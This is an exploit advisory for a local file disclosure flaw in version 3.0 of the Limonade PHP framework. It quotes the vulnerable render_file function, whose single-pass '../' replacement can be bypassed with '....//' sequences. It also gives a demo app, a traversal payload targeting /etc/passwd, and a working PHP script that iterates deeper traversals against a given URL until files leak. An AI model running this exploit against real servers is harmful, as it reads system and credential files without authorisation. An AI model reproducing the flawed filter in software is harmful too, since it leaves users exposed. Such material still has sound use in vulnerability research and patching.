# Exploit Title: Limonade framework Local file disclosure filtering bypass
# Date: 2013 17 November
# Exploit Author: Yashar shahinzadeh
# Special thanks to Mormoroth
# Credit goes for: http://y-shahinzadeh.ir & ha.cker.ir
# Vendor Homepage: http://limonade-php.github.io/â€Ž
# Tested on: Linux (Ubuntu), PHP 5.3.10-1ubuntu3.8 with Suhosin-Patch
# Affected Version :  3.0 (Last)
#
# Contacts: {http://Twitter.com/YShahinzadeh, http://y-shahinzadeh.ir, http://Twitter.com/Mormoroth, http://mormoroth.ir}
###################################################################################################################################
 
1. Filtering bypass
===================
Limonade is a light framework suffering from Local file disclosure, following lines written at lib/limonade.php make the vulnerability:

File: lib/limonade.php
...
...

function render_file($filename, $return = false)
{
  # TODO implements X-SENDFILE headers
  // if($x-sendfile = option(&#039;x-sendfile&#039;))
  // {
  //    // add a X-Sendfile header for apache and Lighttpd >= 1.5
  //    if($x-sendfile > X-SENDFILE) // add a X-LIGHTTPD-send-file header 
  //   
  // }
  // else
  // {
  //   
  // }
  $filename = str_replace(&#039;../&#039;, &#039;&#039;, $filename);
  if(file_exists($filename))
  {
    $content_type = mime_type(file_extension($filename));
    $header = &#039;Content-type: &#039;.$content_type;
    if(file_is_text($filename)) $header .= &#039;; charset=&#039;.strtolower(option(&#039;encoding&#039;));
    send_header($header);
    return file_read($filename, $return);
  }
  else halt(NOT_FOUND, "unknown filename $filename");
}

...
...

str_replace() function has been used in inefficient way which reasults in having LFD hole. Following piece of code can be used to demonstrade it:

<?php
require_once dirname(dirname(__FILE__)).&#039;/lib/limonade.php&#039;;
 
function configure()
{
    option(&#039;env&#039;, ENV_DEVELOPMENT);
}
 
dispatch(&#039;/&#039;,&#039;index&#039;);
function index()
{
    set(&#039;page_title&#039;, "using content_for()");
}
   
dispatch_post(&#039;/file/:file&#039;,&#039;FileContents&#039;);
function FileContents()
{
    params($_POST);
    var_dump(render_file(params(&#039;file&#039;)));
}
 
run();
?>

What will happen if HTTP request below is sent:
....//....//....//....//etc/passwd
Apparently, immediate filtering system applies a replacement which produces:
../../../../etc/passwd

Here is the exploit:

<?php
set_time_limit(0);
 
/** Error reporting **/
error_reporting(0);
 
/** Necessary variables **/
$url = $argv[1];
$data = $argv[2];
$needle = $argv[3];
 
/** Curl function with appropriate adjustments **/
function CurlPost($url=&#039;localhost&#039;,$data=array())
{
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,FALSE);
    curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,2);
    curl_setopt($ch,CURLOPT_HEADER,1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch,CURLOPT_TIMEOUT,50);
    curl_setopt($ch,CURLOPT_POST,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
    return curl_exec($ch);
    curl_close($ch);
}
 
list($param,$file) = explode(&#039;:&#039;,$data);
 
$FilterBypassing = &#039;....//&#039;;
for($i=0;$i<10;$i++)
{
    $DataToPost[$param] = $FilterBypassing.$file;
    $response = CurlPost($url,$DataToPost);
    if(strstr($response,$needle)!==FALSE)
    {
        echo $response;
        echo "\n\nExploited successfully!\n";
        echo &#039;Payload: &#039;,$DataToPost[$param],"\n\n\n";
        die();
    }
     
    $FilterBypassing .= &#039;....//&#039;;
}
?>

Illustration: http://blog.y-shahinzadeh.ir/posts-images/limonade/1.jpg

/** Yasshar shahinzadeh **/

